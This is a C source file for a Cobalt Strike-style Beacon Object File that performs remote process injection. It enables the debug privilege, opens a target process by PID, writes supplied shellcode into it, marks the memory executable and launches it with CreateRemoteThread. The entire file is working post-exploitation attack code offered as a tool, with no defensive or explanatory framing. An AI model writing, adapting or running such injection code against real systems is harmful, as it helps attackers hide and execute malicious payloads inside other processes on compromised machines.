#define BOF

#include <windows.h>
#include "beacon.h"
#include "declarations.h"

void go( char * args, int argc ) {
  datap   parser;
  DWORD   pid;
  char *  shellcode;
  int     shellcodeLen;
  HANDLE  hProcess;
  DWORD   oldProtect;

  BeaconDataParse ( &parser, args, argc );
  
  pid       = BeaconDataInt ( &parser );
  shellcode = BeaconDataExtract ( &parser, &shellcodeLen );

  if ( shellcodeLen == 0 ) 
  {
    BeaconPrintf ( CALLBACK_ERROR, "[-] Shellcode not provided\n" );
    return;
  }

  BeaconPrintf ( CALLBACK_OUTPUT,"[+] Target PID %d\n", pid );
  BeaconPrintf ( CALLBACK_OUTPUT,"[+] Shellcode size %d bytes\n", shellcodeLen );

  enableToken ( KERNEL32$GetCurrentProcess () );

  hProcess = GetProcessHandle ( pid );

  LPVOID buffer = KERNEL32$VirtualAllocEx ( hProcess, NULL, shellcodeLen, ( MEM_RESERVE | MEM_COMMIT ), PAGE_READWRITE );
  if ( buffer == NULL )
  {
    BeaconPrintf ( CALLBACK_ERROR, "[-] Could not allocate shellcode in target process\n" );
    return;
  }

  BeaconPrintf ( CALLBACK_OUTPUT, "[+] Allocated shellcode as READ_WRITE at @ %p\n", buffer );

  if ( !KERNEL32$WriteProcessMemory ( hProcess, buffer, shellcode, shellcodeLen, NULL ) )
  {
    BeaconPrintf ( CALLBACK_ERROR, "[-] WriteProcessMemory to %d\n failed", pid );
    return;
  }

  BeaconPrintf ( CALLBACK_OUTPUT, "[+] Shellcode written into process %d\n", pid );

  if ( !KERNEL32$VirtualProtectEx ( hProcess, buffer, shellcodeLen, PAGE_EXECUTE, &oldProtect ) )
  {
    BeaconPrintf ( CALLBACK_ERROR, "[-] Cannot change memory permissions with VirtualProtectEx\n");
    return;
  }

  BeaconPrintf ( CALLBACK_OUTPUT, "[+] Memory permissions changed to PAGE_EXECUTE at @ %p\n", buffer );
  BeaconPrintf ( CALLBACK_OUTPUT, "[+] Spawning shellcode at %d\n", pid );

  KERNEL32$CreateRemoteThread ( hProcess, NULL, 0, ( LPTHREAD_START_ROUTINE ) buffer, NULL, 0, NULL  );

  KERNEL32$CloseHandle ( hProcess );
}

HANDLE GetProcessHandle ( DWORD pid ) {
  HANDLE hProcess = KERNEL32$OpenProcess ( PROCESS_ALL_ACCESS, FALSE, pid );
  if ( hProcess == NULL )
  {
    BeaconPrintf ( CALLBACK_ERROR, "[-] Unable to get handle at PID %d\n", pid );
    return NULL;
  }

  return hProcess;
}


/* 
  i've realized that doesn't make sense to return
  the handle of the token because all the operations
  happens inside the function.
  should use ai to realize it before xd.
*/
void enableToken ( HANDLE hProcess ) {
  HANDLE            hToken;
  TOKEN_PRIVILEGES  tPrivs;

  ADVAPI32$OpenProcessToken       ( hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken );
  ADVAPI32$LookupPrivilegeValueA  ( NULL, SE_DEBUG_NAME, &tPrivs.Privileges[ 0 ].Luid );

  tPrivs.PrivilegeCount             = 1;
  tPrivs.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

  if ( !ADVAPI32$AdjustTokenPrivileges ( hToken, FALSE, &tPrivs, 0, ( PTOKEN_PRIVILEGES ) NULL, 0  ) ) 
  {
    BeaconPrintf ( CALLBACK_ERROR, "[-] Cannot adjust token privileges\n");
    return;
  } 

  KERNEL32$CloseHandle ( hToken );
}